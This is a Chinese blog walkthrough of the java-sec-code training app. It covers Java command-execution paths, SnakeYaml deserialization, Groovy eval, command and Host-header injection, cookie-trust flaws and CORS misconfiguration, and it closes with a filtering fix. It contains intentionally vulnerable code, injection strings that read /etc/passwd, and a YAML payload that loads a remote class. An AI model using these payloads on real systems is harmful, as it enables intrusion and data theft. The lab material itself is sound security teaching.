<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ProcessBuilder1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmds &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;&#125;;</span><br><span class="line">            ProcessBuilder builder &#x3D; new ProcessBuilder(cmds);</span><br><span class="line">            Process process &#x3D; builder.start();</span><br><span class="line">            InputStream in &#x3D; process.getInputStream();</span><br><span class="line">            &#x2F;&#x2F;获取输入流</span><br><span class="line">            InputStreamReader ins &#x3D; new InputStreamReader(in, &quot;utf-8&quot;);</span><br><span class="line">            &#x2F;&#x2F; 字节流转化为字符流，并指定编码格式</span><br><span class="line">            char[] chs &#x3D; new char[1024];</span><br><span class="line">            int len &#x3D; ins.read(chs);</span><br><span class="line">            System.out.println(new String(chs,0,len));</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            </span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过ProcessBuilder类执行系统命令获取结果。注意将命令隔开，同样转化为字符流InputStreamReader，并指定编码格式。read方法读取该字符流。将结果转化为字符串进行输出。</p>
<p>打开<a href="http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png" alt="image-20210827143330503"></p>
<p>Java-sec-code如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;ProcessBuilder?cmd&#x3D;whoami</span><br><span class="line"> * @param cmd cmd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">        Process p &#x3D; processBuilder.start();</span><br><span class="line">        BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Idea调试如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png" alt="image-20210827143456512"></p>
<h3 id="3-反射调用Processlmpl-类执行系统命令"><a href="#3-反射调用Processlmpl-类执行系统命令" class="headerlink" title="3) 反射调用Processlmpl 类执行系统命令"></a>3) 反射调用Processlmpl 类执行系统命令</h3><p>Runtime和ProcessBuilder执行命令实际上调用了也是ProcessImpl类。对于该类，没有构造方法，只有一个private类型的方法。可以通过反射调用。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">Process e &#x3D; (Process) method.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, &quot;.&quot;, null, true); </span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从ProcessImpl类的class对象中获取到方法然后反射调用，获取字节输入流getInputStream的结果。ByteArrayOutputStream 创建字节数组缓冲区。read() 方法读取字节流大小，并写进缓冲区。最后将缓冲区结果转化为字符串，并指定utf-8编码格式输出。</p>
<h3 id="4-反射调用Runtime类执行系统命令"><a href="#4-反射调用Runtime类执行系统命令" class="headerlink" title="4) 反射调用Runtime类执行系统命令"></a>4) 反射调用Runtime类执行系统命令</h3><p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor constructor &#x3D; clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">Object runtimeInstance &#x3D; constructor.newInstance();</span><br><span class="line">Method runtimeMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Process process &#x3D; (Process) runtimeMethod.invoke(runtimeInstance, &quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p><code>java.lang.Runtime</code>类的无参构造方法私有的，可以通过反射修改方法的访问权限setAccessible，强制可以访问，然后获取类构造器的方法。再通过类加载newInstance()创建对象，反射再调用方法。</p>
<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-JavaScript命令执行"><a href="#5-JavaScript命令执行" class="headerlink" title="5) JavaScript命令执行"></a>5) JavaScript命令执行</h3><p>javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码.</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String str &#x3D; &quot;Jscode&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line">import javax.script.ScriptException;</span><br><span class="line">public class Jsexec &#123;</span><br><span class="line">    public static void main(String[] argv) throws ScriptException &#123;</span><br><span class="line">        String str &#x3D; &quot;function test()&#123; return java.lang.Runtime&#125;;r&#x3D;test();r.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上。可以成功弹出计算器,如果遇到关键字检测。还可以用注释和空格绕过。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png" alt="image-20210827145640867"></p>
<p>查看Java-sec-code代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;jscmd?jsurl&#x3D;http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> *</span><br><span class="line"> * curl http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> * var a &#x3D; mainOutput(); function mainOutput() &#123; var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="line"> *</span><br><span class="line"> * @param jsurl js url</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;jscmd&quot;)</span><br><span class="line">public void jsEngine(String jsurl) throws Exception&#123;</span><br><span class="line">    &#x2F;&#x2F; js nashorn javascript ecmascript</span><br><span class="line">    ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">    Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    String cmd &#x3D; String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用Python本地起一个服务器，写入JS进行触发</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png" alt="image-20210827152848993"></p>
<h3 id="6）Yaml反序列化命令执行"><a href="#6）Yaml反序列化命令执行" class="headerlink" title="6）Yaml反序列化命令执行"></a>6）Yaml反序列化命令执行</h3><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)</span><br><span class="line">public void yarm(String agrs) &#123;</span><br><span class="line">    String content &#x3D; &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">            &quot; !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">            &quot; !!java.net.URL [\&quot;http:&#x2F;&#x2F;o5s7wr.dnslog.cn\&quot;]\n&quot; +</span><br><span class="line">            &quot; ]]\n&quot; +</span><br><span class="line">            &quot;]&quot;;</span><br><span class="line">    Yaml y &#x3D; new Yaml();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行测试</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png" alt="image-20210827175118150"></p>
<p>使用师傅写好的利用脚本进行利用利用 <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>打开并修改代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package artsploit;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class="line"></span><br><span class="line">    public AwesomeScriptEngineFactory() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getNames() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getParameter(String key) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getProgram(String... statements) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ScriptEngine getScriptEngine() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p>
<p><a href="https://www.pdai.tech/md/java/advanced/java-advanced-spi.html">JavaSPI机制详解</a></p>
<p>使用Python搭建简单的WEB服务后进行利用</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png" alt="image-20210827180832145"></p>
<h3 id="7）Groovy-命令执行"><a href="#7）Groovy-命令执行" class="headerlink" title="7）Groovy 命令执行"></a>7）Groovy 命令执行</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p>
<p>可以使用GroovyShell类来执行任何Groovy脚本</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;groovy?content&#x3D;&quot;open -a Calculator&quot;.execute()</span><br><span class="line"> * @param content groovy shell</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;groovy&quot;)</span><br><span class="line">public void groovyshell(String content) &#123;</span><br><span class="line">    GroovyShell groovyShell &#x3D; new GroovyShell();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行利用如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png" alt="image-20210827183410408"></p>
<h2 id="2-CommandInject"><a href="#2-CommandInject" class="headerlink" title="2. CommandInject"></a>2. CommandInject</h2><p>命令行直接对请求参数进行拼接，可利用特殊字符分割执行其他命令</p>
<h3 id="1-参数注入"><a href="#1-参数注入" class="headerlink" title="1.参数注入"></a>1.参数注入</h3><p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject?filepath&#x3D;&#x2F;tmp;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> *</span><br><span class="line"> * @param filepath filepath</span><br><span class="line"> * @return result</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&quot;)</span><br><span class="line">public String codeInject(String filepath) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd">http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png" alt="image-20210831100839084"></p>
<h3 id="2-Host注入"><a href="#2-Host注入" class="headerlink" title="2.Host注入"></a>2.Host注入</h3><p>在HTTP请求的host中命令执行</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Host Injection</span><br><span class="line"> * Host: hacked by joychou;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject&#x2F;host</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;host&quot;)</span><br><span class="line">public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; request.getHeader(&quot;host&quot;);</span><br><span class="line">    logger.info(host);</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dnslog进行测试</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png" alt="image-20210831103040958"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png" alt="image-20210831103104271"></p>
<p>进行命令注入时失败：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png" alt="image-20210831111452797"></p>
<p>查找半天原因之后发现</p>
<blockquote>
<p>是tomcat的版本问题,tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误,<br> 这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])。</p>
</blockquote>
<p>建议大家下一个低版本进行测试～</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png" alt="image-20210831120816642"></p>
<h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath &#x3D; SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null &#x3D;&#x3D; filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进FILTER_PATTERN函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\.-]+$&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png" alt="image-20210831142136765"></p>
<h2 id="3-Broken-Access-Control"><a href="#3-Broken-Access-Control" class="headerlink" title="3. Broken Access Control"></a>3. Broken Access Control</h2><p>某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick，导致越权问题。具体写法可能有<a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Cookies.java">Cookies代码</a>里的几种情况。</p>
<p>代码有如下几种情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="line"> *&#x2F;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;cookie&quot;)</span><br><span class="line">public class Cookies &#123;</span><br><span class="line"></span><br><span class="line">    private static String NICK &#x3D; &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln01&quot;)</span><br><span class="line">    public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; WebUtils.getCookieValueByName(req, NICK); &#x2F;&#x2F; key code</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln02&quot;)</span><br><span class="line">    public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie[] cookie &#x3D; req.getCookies();</span><br><span class="line"></span><br><span class="line">        if (cookie !&#x3D; null) &#123;</span><br><span class="line">            nick &#x3D; getCookie(req, NICK).getValue();  &#x2F;&#x2F; key code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                &#x2F;&#x2F; key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  &#x2F;&#x2F; key code</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln05&quot;)</span><br><span class="line">    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value &#x3D; &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打开<a href="http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现">http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png" alt="image-20210901161038686"></p>
<h2 id="4-Cors"><a href="#4-Cors" class="headerlink" title="4. Cors"></a>4. Cors</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p>
<p>前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法：</p>
<ul>
<li>XMLHttpRequest</li>
<li>JQuery的<code>$.ajax</code></li>
<li>Fetch</li>
</ul>
<p>前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin)</code>，那么Response的header中不会出现<code>Access-Control-Allow-Origin</code>，因为Origin为空。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png" alt="image-20210901162616408"></p>
<p>在这样配置可以去访问任何服务资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>可以用curl来验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i  $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Origin: http:&#x2F;&#x2F;www.baidu.com&#39; \</span><br><span class="line">    -b $&#39;remember-me&#x3D;YWRtaW46MTYzMTY5MTA4NTA2OTpkZWYwZTFiYjc2MmZhYzFiMzdjMDc2MzNiYjcxOGJkOQ; JSESSIONID&#x3D;2F6ED87C606984C0547455D72FE2B9EE; XSRF-TOKEN&#x3D;1536dc0b-8b8b-4955-b669-c5b9f9b4bd6d&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;cors&#x2F;vuln&#x2F;origin&#39;</span><br></pre></td></tr></table></figure>

<p>Java-sec-code需要cookie来利用无cooike的poc如下</p>
<p>GET：</p>
